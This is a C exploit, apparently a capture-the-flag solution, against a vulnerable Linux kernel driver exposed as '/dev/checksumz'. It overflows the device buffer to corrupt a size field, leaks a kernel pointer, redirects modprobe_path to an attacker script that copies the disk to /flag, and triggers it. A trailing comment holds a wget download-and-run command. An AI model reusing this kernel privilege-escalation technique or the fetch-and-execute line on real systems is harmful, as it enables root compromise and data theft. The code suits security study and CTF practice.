#include "api.h"
#include "stdio.h"
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "stdio.h"
#include "fcntl.h"
#include "unistd.h"



void leak_mem(uint64_t addr) {

}

int main() {
    int fd = open("/dev/checksumz", O_RDWR);
    // TODO: checksum the file 4 bytes at a time and recover
    /*TODO: can we recover the file byte by byte by:
    open the file with checksumz_open (how?)
    set buffer size to 1 with CHECKSUMZ_IOCTL_RESIZE
    call CHECKSUMZ_IOCTL_PROCESS
    call CHECKSUMZ_IOCTL_DIGEST

*/

    // Position is only checked after read and write
    // So we can write up to 16 bytes past end of buffer and read 256 past
    //char data[] = "asddddddddddd";
    //lseek(fd, 0, SEEK_SET);
//
    //int numwritten = write(fd, data, sizeof(data));
    //printf("wrote2 %d\n", numwritten);
//
    // Read past end of buffer
   // lseek(fd, 0, SEEK_END); // seek to end of buffer so we can read past it
   // char buf[256] = {0};
   // int numread = read(fd, buf, sizeof(buf));
//
   // printf("read %d bytes\n", numread);
   // printf("size: 0x%lx\n", *(size_t*)(buf+1));
   // printf("read: 0x%lx\n", *(size_t*)(buf+9));
   // printf("name: %p\n", (char*)(buf+17));
   // printf("s1: %u\n", *(uint32_t*)(buf+25));
   // printf("s2: %u\n", *(uint32_t*)(buf+29));


    //TODO: can use ioctl to rename with name buffer set to kernel address then read from it at offset 1016 (with multiple runs it changes because name isn't freed :|)

    char data[] = {
        0, // last byte of buf
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // overwrite size to max
    };
    lseek(fd, 0, SEEK_END); // seek to end of buffer so we can read past it
    int numwritten = write(fd, data, sizeof(data));
    printf("wrote %d\n", numwritten);

    // Read past end of buffer
    lseek(fd, 512, SEEK_SET); // seek to end of buffer so we can read past it
    char buf[256] = {0};
    int numread = read(fd, buf, sizeof(buf));

    printf("read %d bytes\n", numread);
    printf("size: 0x%lx\n", *(size_t*)(buf));
    printf("read: 0x%lx\n", *(size_t*)(buf+8));
    printf("name: %p\n", (char*)(buf+16));
    printf("s1: %u\n", *(uint32_t*)(buf+24));
    printf("s2: %u\n", *(uint32_t*)(buf+28));

    // leak past end of buffer
    uint64_t chunk = 0;
    for (uint64_t i = 0; i < 8192; i+=sizeof(chunk))
    {
        lseek(fd, i, SEEK_SET);

        numread = read(fd, &chunk, sizeof(chunk));

        if (chunk == 0)
            continue;

        if ((chunk & 0xffff) == 0x8610)
        {
            uint64_t leak_offset_to_modprobe = 15952624;
            // We found the kernel leak we're looking for
            uint64_t modprobe_path_addr = chunk + leak_offset_to_modprobe;
            printf("modprobe_path address: 0x%lx\n", modprobe_path_addr);

            // Overwrite name to point to modprobe
            // Seek to name
            lseek(fd, 512+16, SEEK_SET);
            //modprobe_path_addr = 0x4141414141414141;
            int numwritten = write(fd, &modprobe_path_addr, sizeof(modprobe_path_addr));

            printf("Wrote %d bytes\n", numwritten);

            lseek(fd, 512, SEEK_SET); // seek to end of buffer so we can read past it
            char buf[256] = {0};
            int numread = read(fd, buf, sizeof(buf));

            printf("read %d bytes\n", numread);
            printf("size: 0x%lx\n", *(size_t*)(buf));
            printf("read: 0x%lx\n", *(size_t*)(buf+8));
            printf("name: %p\n", (char*)(buf+16));
            printf("s1: %u\n", *(uint32_t*)(buf+24));
            printf("s2: %u\n", *(uint32_t*)(buf+28));

            // Write executable shell script on disk
            puts("Make modprobe script");
            system("echo '#!/bin/sh\ncp /dev/vda /flag' > /tmp/modprobe");
            system("chmod +x /tmp/modprobe");

            puts("Write unknown file");
            system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
            system("chmod +x /tmp/dummy");

            // ioctl to set name to shell script path
            char myname[48];
            memset(myname, 0, sizeof(myname));
            strcpy(myname, "/tmp/modprobe");

            printf("address of new name buf: %p\n", myname);
            if (ioctl(fd, CHECKSUMZ_IOCTL_RENAME, myname) != 0)
            {
                puts("IOCTL FAILED");
            }

            // Try to run file with unknown format

            puts("[+] Run unknown file");
            system("/tmp/dummy");

            puts("Read flag");
            system("cat /flag");
            break;
        }

        printf("read %d bytes af %lu\n", numread, i);
        printf("%08lx\n", chunk);
    }

    // Add 15952624 to get modprobe_path maybe

    //TODO: overwrite size to be big then we can read after the structure and see if there's anything interesting

    //TODO: pos is an int so we can overflow it to make it negative

    close(fd);
    return 0;
}

/*
rm -f exploit && wget 10.0.2.2:8080/exploit && chmod +x exploit && ./exploit
*/

// aslr is 3 nibbles so 4096 possibilities
//ffffffffa7f3f100 D modprobe_path
//ffffffff83b3f100
//ffffffffba93f100


/*
read 8 bytes af 3064
1086e0a3ffffffff

ffffffffa3e08610
ffffffffa4d3f100

read 8 bytes af 3072
e07fe0a3ffffffff
*/
